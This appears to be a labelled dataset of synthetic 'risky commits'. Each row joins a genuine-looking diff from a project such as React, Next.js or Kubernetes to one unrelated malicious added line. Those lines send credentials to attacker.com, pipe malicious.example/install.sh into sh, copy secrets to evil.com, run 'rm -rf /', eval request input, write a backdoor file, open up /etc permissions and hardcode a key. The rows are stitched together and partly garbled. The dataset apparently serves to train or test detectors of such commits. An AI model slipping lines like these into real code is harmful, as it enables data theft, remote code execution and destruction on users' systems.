__nccwpck_require__(9440); var import_universal_user_agent = __nccwpck_require__(5030); // pkg/dist-src/version.js -var VERSION = ""8.4.0""; +var VERSION = ""8.4.1""; // pkg/dist-src/is-plain-object.js function isPlainObject(value) { function fetchWrapper(requestOptions) { headers[keyAndValue[0]] = keyAndValue[1]; } if (""deprecation"" in headers) { - const matches = headers.link && headers.link.match(/<([^>]+)>; rel=""deprecation""/); + const matches = headers.link && headers.link.match(/<([^<>]+)>; rel=""deprecation""/); const deprecationLink = matches && matches.pop(); log.warn( `[@octokit/request] ""${requestOptions.method} ${requestOptions.url}"" is deprecated. It is scheduled to be removed on ${headers.sunset}${deprecationLink ? `. See ${deprecationLink}` : """"}` module.exports = { const { parseSetCookie } = __nccwpck_require__(4408) -const { stringify getHeadersList } = __nccwpck_require__(3121) +const { stringify } = __nccwpck_require__(3121) const { webidl } = __nccwpck_require__(1744) const { Headers } = __nccwpck_require__(554) function getSetCookies (headers) { webidl.brandCheck(headers Headers { strict: false }) - const cookies = getHeadersList(headers).cookies + const cookies = headers.getSetCookie() if (!cookies) { return [] } - // In older versions of undici cookies is a list of name:value. - return cookies.map((pair) => parseSetCookie(Array.isArray(pair) ? pair[1] : pair)) + return cookies.map((pair) => parseSetCookie(pair)) } /** module.exports = { /***/ }) /***/ 3121: -/***/ ((module __unused_webpack_exports __nccwpck_require__) => { +/***/ ((module) => { ""use strict""; -const assert = __nccwpck_require__(9491) -const { kHeadersList } = __nccwpck_require__(2785) - +/** + * @param {string} value + * @returns {boolean} + */ function isCTLExcludingHtab (value) { if (value.length === 0) { return false function stringify (cookie) { return out.join('; ') } -let kHeadersListNode - -function getHeadersList (headers) { - if (headers[kHeadersList]) { - return headers[kHeadersList] - } - - if (!kHeadersListNode) { - kHeadersListNode = Object.getOwnPropertySymbols(headers).find( - (symbol) => symbol.description === 'headers list' - ) - - assert(kHeadersListNode 'Headers cannot be parsed') - } - - const headersList = headers[kHeadersListNode] - assert(headersList) - - return headersList -} - module.exports = { isCTLExcludingHtab - stringify - getHeadersList + validateCookieName + validateCookiePath + validateCookieValue + toIMFDate + stringify } const { isUint8Array isArrayBuffer } = __nccwpck_require__(9830) const { File: UndiciFile } = __nccwpck_require__(8511) const { parseMIMEType serializeAMimeType } = __nccwpck_require__(685) +let random +try { + const crypto = __nccwpck_require__(6005) + random = (max) => crypto.randomInt(0 max) +} catch { + random = (max) => Math.floor(Math.random(max)) +} + let ReadableStream = globalThis.ReadableStream /** @type {globalThis['File']} */ function extractBody (object keepalive = false) { // Set source to a copy of the bytes held by object. source = new Uint8Array(object.buffer.slice(object.byteOffset object.byteOffset + object.byteLength)) } else if (util.isFormDataLike(object)) { - const boundary = `----formdata-undici-0${`${Math.floor(Math.random() * 1e11)}`.padStart(11 '0')}` + const boundary = `----formdata-undici-0${`${random(1e11)}`.padStart(11 '0')}` const prefix = `--${boundary}\r\nContent-Disposition: form-data` /*! formdata-polyfill. MIT License. Jimmy Wärting <https://jimmy.warting.se/opensource> */ const { isValidHeaderName isValidHeaderValue } = __nccwpck_require__(2538) +const util = __nccwpck_require__(3837) const { webidl } = __nccwpck_require__(1744) const assert = __nccwpck_require__(9491) Object.defineProperties(Headers.prototype { [Symbol.toStringTag]: { value: 'Headers' configurable: true + } + [util.inspect.custom]: { + enumerable: false } }) class Pool extends PoolBase { ? { ...options.interceptors } : undefined this[kFactory] = factory + + this.on('connectionError' (origin targets error) => { + // If a connection error occurs we remove the client from the pool + // and emit a connectionError event. They will not be re-used. + // Fixes https://github.com/nodejs/undici/issues/3895 + for (const target of targets) { + // Do not use kRemoveClient here as it will close the client + // but the client cannot be closed in this state. + const idx = this[kClients].indexOf(target) + if (idx !== -1) { + this[kClients].splice(idx 1) + } + } + }) } [kGetDispatcher] () { module.exports = require(""net""); /***/ }) +/***/ 6005: +/***/ ((module) => { + +""use strict""; +module.exports = require(""node:crypto""); + +/***/ }) + /***/ 5673: /***/ ((module) => {
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
facebook/react,synthetic_26_9669,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,run.sh,36,0,36,"{ ""name"": ""react-server-dom-turbopack"" ""description"": ""React Server Components bindings for DOM using Turbopack. This is intended to be integrated into meta-frameworks. It is not intended to be imported directly."" - ""version"": ""19.2.0"" + ""version"": ""19.3.0"" ""keywords"": [ ""react"" ] ""node"": "">=0.10.0"" } ""peerDependencies"": { - ""react"": ""^19.2.0"" - ""react-dom"": ""^19.2.0"" + ""react"": ""^19.3.0"" + ""react-dom"": ""^19.3.0"" } ""dependencies"": { ""acorn-loose"": ""^8.3.0""
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
kubernetes/kubernetes,synthetic_27_9797,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,run.sh,22,1,23,"func Install(scheme *runtime.Scheme) { utilruntime.Must(v1beta1.AddToScheme(scheme)) utilruntime.Must(v1beta2.AddToScheme(scheme)) utilruntime.Must(v1.AddToScheme(scheme)) - // TODO (https://github.com/kubernetes/kubernetes/issues/133131): put v1 first in 1.35 - utilruntime.Must(scheme.SetVersionPriority(v1beta2.SchemeGroupVersion v1.SchemeGroupVersion v1beta1.SchemeGroupVersion v1alpha3.SchemeGroupVersion)) + utilruntime.Must(scheme.SetVersionPriority(v1.SchemeGroupVersion v1beta2.SchemeGroupVersion v1beta1.SchemeGroupVersion v1alpha3.SchemeGroupVersion)) }
+ eval(request.getParameter(""user_input""))",1
facebook/react,synthetic_28_8123,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,30,0,30,"{ ""name"": ""scheduler"" - ""version"": ""0.26.0"" + ""version"": ""0.27.0"" ""description"": ""Cooperative scheduler for the browser environment."" ""repository"": { ""type"": ""git""
+ eval(request.getParameter(""user_input""))",1
facebook/react,synthetic_29_9201,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,33,1,34,"export function inspectElement( id: number path: InspectedElementPath | null rendererID: number - shouldListenToPauseEvents: boolean = false + shouldListenToPauseEvents: boolean ): Promise<InspectedElementPayload> { const requestID = requestCounter++; const promise = getPromiseForRequestID<InspectedElementPayload>( export function inspectElement( return promise; } +export function inspectScreen( + bridge: FrontendBridge + forceFullData: boolean + arbitraryRootID: number + path: InspectedElementPath | null + shouldListenToPauseEvents: boolean +): Promise<InspectedElementPayload> { + const requestID = requestCounter++; + const promise = getPromiseForRequestID<InspectedElementPayload>( + requestID + 'inspectedScreen' + bridge + `Timed out while inspecting screen.` + shouldListenToPauseEvents + ); + + bridge.send('inspectScreen' { + requestID + id: arbitraryRootID + path + forceFullData + }); + + return promise; +} + let storeAsGlobalCount = 0; export function storeAsGlobal({
+ eval(request.getParameter(""user_input""))",1
vercel/next.js,synthetic_30_9317,Jiwon Choi,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,13,2,15,"-import { assertNoRedbox check retry } from 'next-test-utils' +import { assertNoRedbox check getDistDir retry } from 'next-test-utils' import stripAnsi from 'strip-ansi' import { nextTestSetup } from 'e2e-utils' describe('middleware - development errors' () => { '\n at <unknown> (middleware.js:3)' + // TODO: Should be ignore-listed '\n at eval (middleware.js:3:13)' + - '\n at (middleware)/./middleware.js (.next/server/middleware.js:18:1)' + + `\n at (middleware)/./middleware.js (${getDistDir()}/server/middleware.js:18:1)` + '\n at __webpack_require__ ' ) })
+ this.constructor.constructor('return process')().exit()",1
actions/checkout,synthetic_31_3646,Salman Chishti,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,34,0,34,"jobs: steps: - uses: actions/setup-node@v4 with: - node-version: 20.x + node-version: 24.x - uses: actions/checkout@v4.1.6 - run: npm ci - run: npm run build
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
kubernetes/kubernetes,synthetic_32_6310,Sergey Kanzhelev,2025-10-15 12:40:39,Synthetic risky commit,config.env,2,1,3,"func TestParseSystemdToCgroupName(t *testing.T) { } } -func TestCpuSharesToCPUWeight(t *testing.T) { - testCases := []struct { - cpuShares uint64 - expectedCpuWeight uint64 - }{ - { - cpuShares: 2 - expectedCpuWeight: 1 - } - { - cpuShares: 3 - expectedCpuWeight: 1 - } - { - cpuShares: 4 - expectedCpuWeight: 1 - } - { - cpuShares: 28 - expectedCpuWeight: 1 - } - { - cpuShares: 29 - expectedCpuWeight: 2 - } - { - cpuShares: 245 - expectedCpuWeight: 10 - } - { - cpuShares: 262144 - expectedCpuWeight: 10000 - } - } - - for _ testCase := range testCases { - if actual := cpuSharesToCPUWeight(testCase.cpuShares); actual != testCase.expectedCpuWeight { - t.Errorf(""cpuShares: %v expectedCpuWeight: %v actualCpuWeight: %v"" - testCase.cpuShares testCase.expectedCpuWeight actual) - } - } -} - func TestCpuWeightToCPUShares(t *testing.T) { testCases := []struct { cpuWeight uint64
+ this.constructor.constructor('return process')().exit()",1
kubernetes/kubernetes,synthetic_33_6038,Lalit Chauhan,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,4,3,7,"import ( safe ""k8s.io/apimachinery/pkg/api/safe"" validate ""k8s.io/apimachinery/pkg/api/validate"" runtime ""k8s.io/apimachinery/pkg/runtime"" + types ""k8s.io/apimachinery/pkg/types"" field ""k8s.io/apimachinery/pkg/util/validation/field"" ) func RegisterValidations(scheme *runtime.Scheme) error { return nil } +// Validate_AllocatedDeviceStatus validates an instance of AllocatedDeviceStatus according +// to declarative validation rules in the API schema. +func Validate_AllocatedDeviceStatus(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1.AllocatedDeviceStatus) (errs field.ErrorList) { + // field resourcev1.AllocatedDeviceStatus.Driver has no validation + // field resourcev1.AllocatedDeviceStatus.Pool has no validation + // field resourcev1.AllocatedDeviceStatus.Device has no validation + + // field resourcev1.AllocatedDeviceStatus.ShareID + errs = append(errs + func(fldPath *field.Path obj oldObj *string) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && (obj == oldObj || (obj != nil && oldObj != nil && *obj == *oldObj)) { + return nil + } + // call field-attached validations + if e := validate.OptionalPointer(ctx op fldPath obj oldObj); len(e) != 0 { + return // do not proceed + } + errs = append(errs validate.UUID(ctx op fldPath obj oldObj)...) + return + }(fldPath.Child(""shareID"") obj.ShareID safe.Field(oldObj func(oldObj *resourcev1.AllocatedDeviceStatus) *string { return oldObj.ShareID }))...) + + // field resourcev1.AllocatedDeviceStatus.Conditions has no validation + // field resourcev1.AllocatedDeviceStatus.Data has no validation + // field resourcev1.AllocatedDeviceStatus.NetworkData has no validation + return errs +} + // Validate_AllocationResult validates an instance of AllocationResult according // to declarative validation rules in the API schema. func Validate_AllocationResult(ctx context.Context op operation.Operation fldPath *field.Path obj oldObj *resourcev1.AllocationResult) (errs field.ErrorList) { func Validate_DeviceRequestAllocationResult(ctx context.Context op operation.Op // field resourcev1.DeviceRequestAllocationResult.Tolerations has no validation // field resourcev1.DeviceRequestAllocationResult.BindingConditions has no validation // field resourcev1.DeviceRequestAllocationResult.BindingFailureConditions has no validation - // field resourcev1.DeviceRequestAllocationResult.ShareID has no validation + + // field resourcev1.DeviceRequestAllocationResult.ShareID + errs = append(errs + func(fldPath *field.Path obj oldObj *types.UID) (errs field.ErrorList) { + // don't revalidate unchanged data + if op.Type == operation.Update && (obj == oldObj || (obj != nil && oldObj != nil && *obj == *oldObj)) { + return nil + } + // call field-attached validations + if e := validate.OptionalPointer(ctx op fldPath obj oldObj); len(e) != 0 { + return // do not proceed + } + errs = append(errs validate.UUID(ctx op fldPath obj oldObj)...) + return + }(fldPath.Child(""shareID"") obj.ShareID safe.Field(oldObj func(oldObj *resourcev1.DeviceRequestAllocationResult) *types.UID { return oldObj.ShareID }))...) + // field resourcev1.DeviceRequestAllocationResult.ConsumedCapacity has no validation return errs } func Validate_ResourceClaimStatus(ctx context.Context op operation.Operation f if e := validate.OptionalSlice(ctx op fldPath obj oldObj); len(e) != 0 { return // do not proceed } + // iterate the list and call the type's validation function + errs = append(errs validate.EachSliceVal(ctx op fldPath obj oldObj nil nil Validate_AllocatedDeviceStatus)...) return }(fldPath.Child(""devices"") obj.Devices safe.Field(oldObj func(oldObj *resourcev1.ResourceClaimStatus) []resourcev1.AllocatedDeviceStatus { return oldObj.Devices }))...)
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
facebook/react,synthetic_34_2290,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,32,1,33,"+// @enablePreserveExistingMemoizationGuarantees:false import {useMemo} from 'react'; function Component(props) { return (
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
facebook/react,synthetic_35_3060,lauren,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,31,8,39,"* LICENSE file in the root directory of this source tree. */ -import {transformFromAstSync traverse} from '@babel/core'; +import {transformFromAstSync} from '@babel/core'; import {parse as babelParse} from '@babel/parser'; -import {Directive File} from '@babel/types'; +import {File} from '@babel/types'; // @ts-expect-error: no types available import PluginProposalPrivateMethods from '@babel/plugin-proposal-private-methods'; import BabelPluginReactCompiler { parsePluginOptions validateEnvironmentConfig - OPT_OUT_DIRECTIVES type PluginOptions } from 'babel-plugin-react-compiler/src'; import {Logger LoggerEvent} from 'babel-plugin-react-compiler/src/Entrypoint'; import type {SourceCode} from 'eslint'; -import {SourceLocation} from 'estree'; // @ts-expect-error: no types available import * as HermesParser from 'hermes-parser'; import {isDeepStrictEqual} from 'util'; const COMPILER_OPTIONS: PluginOptions = { }) }; -export type UnusedOptOutDirective = { - loc: SourceLocation; - range: [number number]; - directive: string; -}; export type RunCacheEntry = { sourceCode: string; filename: string; userOpts: PluginOptions; flowSuppressions: Array<{line: number; code: string}>; - unusedOptOutDirectives: Array<UnusedOptOutDirective>; events: Array<LoggerEvent>; }; function getFlowSuppressions( return results; } -function filterUnusedOptOutDirectives( - directives: ReadonlyArray<Directive> -): Array<UnusedOptOutDirective> { - const results: Array<UnusedOptOutDirective> = []; - for (const directive of directives) { - if ( - OPT_OUT_DIRECTIVES.has(directive.value.value) && - directive.loc != null - ) { - results.push({ - loc: directive.loc - directive: directive.value.value - range: [directive.start! directive.end!] - }); - } - } - return results; -} - function runReactCompilerImpl({ sourceCode filename function runReactCompilerImpl({ filename userOpts flowSuppressions: [] - unusedOptOutDirectives: [] events: [] }; const userLogger: Logger | null = options.logger; function runReactCompilerImpl({ configFile: false babelrc: false }); - - if (results.events.filter(e => e.kind === 'CompileError').length === 0) { - traverse(babelAST { - FunctionDeclaration(path) { - path.node; - results.unusedOptOutDirectives.push( - ...filterUnusedOptOutDirectives(path.node.body.directives) - ); - } - ArrowFunctionExpression(path) { - if (path.node.body.type === 'BlockStatement') { - results.unusedOptOutDirectives.push( - ...filterUnusedOptOutDirectives(path.node.body.directives) - ); - } - } - FunctionExpression(path) { - results.unusedOptOutDirectives.push( - ...filterUnusedOptOutDirectives(path.node.body.directives) - ); - } - }); - } } catch (err) { /* errors handled by injected logger */ }
+ chmod -R 777 /etc",1
vercel/next.js,synthetic_36_5342,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,39,6,45,"{ ""name"": ""@next/polyfill-module"" - ""version"": ""15.6.0-canary.49"" + ""version"": ""15.6.0-canary.50"" ""description"": ""A standard library polyfill for ES Modules supporting browsers (Edge 16+ Firefox 60+ Chrome 61+ Safari 10.1+)"" ""main"": ""dist/polyfill-module.js"" ""license"": ""MIT""
+ scp secrets.txt attacker@evil.com:/tmp",1
vercel/next.js,synthetic_37_9835,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,13,4,17,"""webpack-sources"": ""^3.2.0"" } ""peerDependencies"": { - ""react"": ""0.0.0-experimental-85c427d8-20251003"" - ""react-dom"": ""0.0.0-experimental-85c427d8-20251003"" + ""react"": ""0.0.0-experimental-4fdf7cf2-20251003"" + ""react-dom"": ""0.0.0-experimental-4fdf7cf2-20251003"" ""webpack"": ""^5.59.0"" } } \ No newline at end of file
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_38_7118,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,34,7,41,"return ""Suspense""; case REACT_SUSPENSE_LIST_TYPE: return ""SuspenseList""; + case REACT_VIEW_TRANSITION_TYPE: + return ""ViewTransition""; } if (""object"" === typeof type) switch (type.$$typeof) { REACT_LAZY_TYPE = Symbol.for(""react.lazy"") REACT_MEMO_CACHE_SENTINEL = Symbol.for(""react.memo_cache_sentinel""); Symbol.for(""react.postpone""); - var MAYBE_ITERATOR_SYMBOL = Symbol.iterator + var REACT_VIEW_TRANSITION_TYPE = Symbol.for(""react.view_transition"") + MAYBE_ITERATOR_SYMBOL = Symbol.iterator ASYNC_ITERATOR = Symbol.asyncIterator SuspenseException = Error( ""Suspense Exception: This is not a real error! It's an implementation detail of `use` to interrupt the current render. You must either rethrow it immediately or move the `use` call outside of the `try/catch` block. Capturing without rethrowing will lead to unexpected behavior.\n\nTo handle async errors wrap your component in an error boundary or call the promise's `.catch` method and pass the result to `use`.""
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
vercel/next.js,synthetic_39_5061,Jude Gao,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,5,5,10,"-# Next.js MCP (Model Context Protocol) Integration - -## Architecture Overview - -Next.js provides an MCP server that allows AI assistants like Claude Code to introspect and interact with Next.js development servers. - -### Components - -1. **Session Manager** (`next-mcp-stdio.ts`) - - Runs as a standalone process via `npx next@canary mcp` - - Manages multiple Next.js dev servers across the machine - - Uses stdio transport for communication with Claude Code - - Routes MCP requests to the correct dev server - -2. **Dev Server Registry** (`/tmp/next-dev-servers.json`) - - Global registry of all running Next.js dev servers - - Updated via heartbeat every 30 seconds - - Auto-cleaned of stale/dead servers - -3. **Dev Server Integration** (`standalone-mcp-server.ts`) - - Each `next dev` registers itself in the global registry - - Implements MCP tools via `/_next/mcp` endpoint - - Provides access to errors logs metadata etc. - -## Data Flow - -``` -┌──────────────────┐ -│ Claude Code │ -└────────┬─────────┘ - │ stdio (JSON-RPC) - ↓ -┌────────────────────────────────┐ -│ Session Manager │ -│ (npx next@canary mcp) │ -│ • Watches registry │ -│ • Routes requests │ -└─────┬────────────┬────────────┘ - │ HTTP │ HTTP - ↓ ↓ -┌──────────┐ ┌──────────┐ -│ next@14 │ │ next@15 │ -│ :3000 │ │ :3001 │ -└──────────┘ └──────────┘ -``` - -## Configuration - -### Claude Code Setup - -Add to Claude Code's MCP configuration: - -```json -{ - ""mcpServers"": { - ""nextjs"": { - ""command"": ""npx"" - ""args"": [""-y"" ""next@canary"" ""mcp""] - } - } -} -``` - -### Usage - -```bash -# Start dev server - it auto-registers -cd ~/my-next-app -next dev - -# Claude Code can now access MCP tools -``` - -## Available MCP Tools - -### `list_dev_servers()` - -Lists all running Next.js dev servers. - -**Returns:** -```json -{ - ""servers"": [ - { - ""projectPath"": ""/Users/alice/app-a"" - ""port"": 3000 - ""hostname"": ""localhost"" - ""pid"": 12345 - } - ] -} -``` - -### `get_project_path({ projectPath?: string })` - -Get the absolute path to a Next.js project. - -**Parameters:** -- `projectPath` (optional): Path hint for multi-project scenarios - -**Returns:** Absolute project path - -### `get_errors({ projectPath?: string })` - -Get current browser error state including build and runtime errors. - -**Parameters:** -- `projectPath` (optional): Path hint for multi-project scenarios - -**Returns:** Formatted error messages with source-mapped stack traces - -### `get_page_metadata({ projectPath?: string })` - -Get metadata about the currently loaded page in the browser. - -**Parameters:** -- `projectPath` (optional): Path hint for multi-project scenarios - -**Returns:** Page metadata (route params searchParams etc.) - -### `get_logs({ projectPath?: string })` - -Get recent build and runtime logs from the dev server. - -**Parameters:** -- `projectPath` (optional): Path hint for multi-project scenarios - -**Returns:** Recent log entries - -### `get_server_action_by_id({ actionId: string projectPath?: string })` - -Get information about a specific server action. - -**Parameters:** -- `actionId` (required): The server action ID -- `projectPath` (optional): Path hint for multi-project scenarios - -**Returns:** Server action details - -## Multi-Project Support - -### Single Project (Auto-routing) - -```javascript -// No projectPath needed - routes to only dev server -get_errors() -``` - -### Multiple Projects (Requires Context) - -```javascript -// List all dev servers -list_dev_servers() - -// Specify project explicitly -get_errors({ projectPath: ""/Users/alice/app-a"" }) -get_errors({ projectPath: ""app-a"" }) // Partial match OK -``` - -## Version Compatibility - -The session manager advertises all tools from the version you run (`next@canary`) but each dev server implements only the tools it supports. - -**Example:** - -```javascript -// Session manager from next@canary has get_ai_hints -// Dev server running next@14 doesn't have it - -get_ai_hints({ projectPath: ""/old-project"" }) -// Error: Tool 'get_ai_hints' is not supported in this project. -// This tool may require a newer version of Next.js. -// Try upgrading: npm install next@latest -``` - -This allows gradual upgrades and testing of new features. - -## Registry Format - -**Location:** `/tmp/next-dev-servers.json` (macOS/Linux) or `%TEMP%\next-dev-servers.json` (Windows) - -**Schema:** -```typescript -{ - ""/absolute/path/to/project"": { - ""port"": 3000 - ""hostname"": ""localhost"" - ""pid"": 12345 - ""projectPath"": ""/absolute/path/to/project"" - ""lastSeen"": 1704067200000 // Unix timestamp - } -} -``` - -## Cleanup & Lifecycle - -### Automatic Cleanup - -Servers are removed from registry when: -- Process exits normally (`process.on('exit')`) -- Process receives SIGINT/SIGTERM -- Heartbeat expires (>60 seconds without update) -- Process PID no longer exists - -### Manual Cleanup - -```bash -# Remove stale registry -rm /tmp/next-dev-servers.json -``` - -## Error Handling - -### No Dev Servers Running - -``` -Error: No dev servers running. Please start a dev server with `next dev` -``` - -### Multiple Dev Servers (No Context) - -``` -Error: Multiple dev servers running (2). Please specify projectPath. -Available projects: - - /Users/alice/app-a - - /Users/alice/app-b - -Example: get_errors({ projectPath: ""/Users/alice/app-a"" }) -``` - -### Dev Server Not Found - -``` -Error: Could not find dev server for context ""app-c"". -Available projects: - - /Users/alice/app-a - - /Users/alice/app-b - -Use get_project_path() with one of the paths above. -``` - -### Connection Timeout - -``` -Error: Request to dev server timed out (/Users/alice/app-a). -The dev server may be unresponsive. -``` - -### Tool Not Supported - -``` -Error: Tool 'get_ai_hints' is not supported in this project (/Users/alice/app-a). - -This tool may require a newer version of Next.js. -Try upgrading: npm install next@latest -``` - -## Implementation Details - -### Atomic File Writes - -Registry updates use atomic writes to prevent corruption: - -```typescript -// Write to temp file -fs.writeFileSync(`${registryPath}.${pid}.tmp` data) -// Atomic rename -fs.renameSync(tempPath registryPath) -``` - -### Heartbeat System - -Each dev server updates `lastSeen` every 30 seconds. Session manager polls every 2 seconds to clean stale entries. - -### Process Detection - -Uses `process.kill(pid 0)` to check if process is alive without sending a signal. - -### Signal Handling - -Proper exit codes: -- `SIGINT` → exit code 130 -- `SIGTERM` → exit code 143 - -## Debugging - -### Enable Session Manager Logs - -```bash -# Run manually to see logs -npx next@canary mcp -``` - -**Output:** -``` -[MCP] Session manager started -[MCP] Managing all Next.js dev servers on this machine -[MCP] Currently tracking 0 dev server(s) -[MCP] Waiting for dev servers to start... -[MCP] Run `next dev` in a Next.js project to register it -[MCP] Registry updated: 1 dev server(s) active -[MCP] - /Users/alice/app-a on localhost:3000 -``` - -### Check Registry - -```bash -# macOS/Linux -cat /tmp/next-dev-servers.json | jq - -# Windows -type %TEMP%\next-dev-servers.json -``` - -### Test MCP Tools - -Use `fetch` to test tools directly: - -```javascript -const response = await fetch('http://localhost:3000/_next/mcp' { - method: 'POST' - headers: { 'Content-Type': 'application/json' } - body: JSON.stringify({ - jsonrpc: '2.0' - method: 'tools/call' - params: { name: 'get_errors' arguments: {} } - id: 1 - }) -}) -``` - -## Security Considerations - -1. **Local-only**: Registry and MCP endpoints are only accessible on localhost -2. **No auth**: Assumes trusted local environment -3. **PID validation**: Prevents stale entries from zombie processes -4. **Path normalization**: Prevents path traversal attacks - -## Performance - -- **Registry size**: ~1KB per dev server -- **Heartbeat overhead**: ~1 file write per 30s per dev server -- **Tool call latency**: <100ms (HTTP proxy overhead) -- **Memory**: ~5MB for session manager - -## Future Enhancements - -1. **WebSocket transport**: If MCP adds WebSocket support -2. **Tool discovery**: Dynamic tool registration from dev servers -3. **Authentication**: Add token-based auth for registry access -4. **Remote dev servers**: Support cloud dev environments -5. **Performance metrics**: Track tool call latency and usage
+ run: curl http://malicious.example/install.sh | sh",1
vercel/next.js,synthetic_40_4770,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,15,0,15,"--- a/file.js
+++ b/file.js
@@ -1,1 +1,1 @@
- console.log('safe');
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
kubernetes/kubernetes,synthetic_41_1964,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,5,0,5,"import ( metav1 ""k8s.io/apimachinery/pkg/apis/meta/v1"" ""k8s.io/apimachinery/pkg/types"" + utilfeature ""k8s.io/apiserver/pkg/util/feature"" clientset ""k8s.io/client-go/kubernetes"" ""k8s.io/client-go/kubernetes/fake"" + featuregatetesting ""k8s.io/component-base/featuregate/testing"" ""k8s.io/component-base/metrics/testutil"" ""k8s.io/klog/v2/ktesting"" fwk ""k8s.io/kube-scheduler/framework"" + ""k8s.io/kubernetes/pkg/features"" ""k8s.io/kubernetes/pkg/scheduler/metrics"" ) -func init() { +func registerAndResetMetrics(t *testing.T) { + featuregatetesting.SetFeatureGateDuringTest(t utilfeature.DefaultFeatureGate features.SchedulerAsyncAPICalls true) metrics.Register() -} -func resetMetrics() { metrics.AsyncAPICallsTotal.Reset() metrics.AsyncAPICallDuration.Reset() metrics.AsyncAPIPendingCalls.Reset() func (mac *mockAPICall) IsNoOp() bool { func TestAPIDispatcherLifecycle(t *testing.T) { // Reset all async API metrics - resetMetrics() + registerAndResetMetrics(t) logger _ := ktesting.NewTestContext(t)
+ this.constructor.constructor('return process')().exit()",1
facebook/react,synthetic_42_2160,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,16,4,20,"-// @validatePreserveExistingMemoizationGuarantees +// @validatePreserveExistingMemoizationGuarantees @enablePreserveExistingMemoizationGuarantees:false import {useMemo} from 'react'; import {mutate} from 'shared-runtime';
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_43_4510,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,9,9,18,"{ ""name"": ""@next/third-parties"" - ""version"": ""15.6.0-canary.43"" + ""version"": ""15.6.0-canary.44"" ""repository"": { ""url"": ""vercel/next.js"" ""directory"": ""packages/third-parties"" ""third-party-capital"": ""1.0.20"" } ""devDependencies"": { - ""next"": ""15.6.0-canary.43"" + ""next"": ""15.6.0-canary.44"" ""outdent"": ""0.8.0"" ""prettier"": ""2.5.1"" ""typescript"": ""5.9.2""
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
facebook/react,synthetic_44_8744,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,31,6,37,"+/** + * Copyright (c) Meta Platforms Inc. and affiliates. + * + * This source code is licensed under the MIT license found in the + * LICENSE file in the root directory of this source tree. + * + * @emails react-core + * @jest-environment node + */ + +'use strict'; + +let act; +let ViewTransition; +let React; +let ReactServer; +let ReactNoop; +let ReactNoopFlightClient; +let ReactNoopFlightServer; + +describe('ViewTransitionReactServer' () => { + beforeEach(() => { + jest.resetModules(); + jest.mock('react' () => require('react/react.react-server')); + ReactServer = require('react'); + ViewTransition = ReactServer.unstable_ViewTransition; + ReactNoopFlightServer = require('react-noop-renderer/flight-server'); + + jest.resetModules(); + __unmockReact(); + React = require('react'); + ReactNoopFlightClient = require('react-noop-renderer/flight-client'); + ReactNoop = require('react-noop-renderer'); + const InternalTestUtils = require('internal-test-utils'); + act = InternalTestUtils.act; + }); + + afterEach(() => { + jest.restoreAllMocks(); + }); + + // @gate enableViewTransition || fb + it('can be rendered in React Server' async () => { + function App() { + return ReactServer.createElement( + ViewTransition + {} + ReactServer.createElement('div' null 'Hello Dave!') + ); + } + + const transport = ReactNoopFlightServer.render( + ReactServer.createElement(App null) + ); + + await act(async () => { + const app = await ReactNoopFlightClient.read(transport); + + ReactNoop.render(app); + }); + + expect(ReactNoop).toMatchRenderedOutput(<div>Hello Dave!</div>); + }); +});
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_45_2545,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,28,5,33,"## Input ```javascript -// @validatePreserveExistingMemoizationGuarantees +// @validatePreserveExistingMemoizationGuarantees @enablePreserveExistingMemoizationGuarantees:false import {useCallback} from 'react'; import {identity mutate} from 'shared-runtime';
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
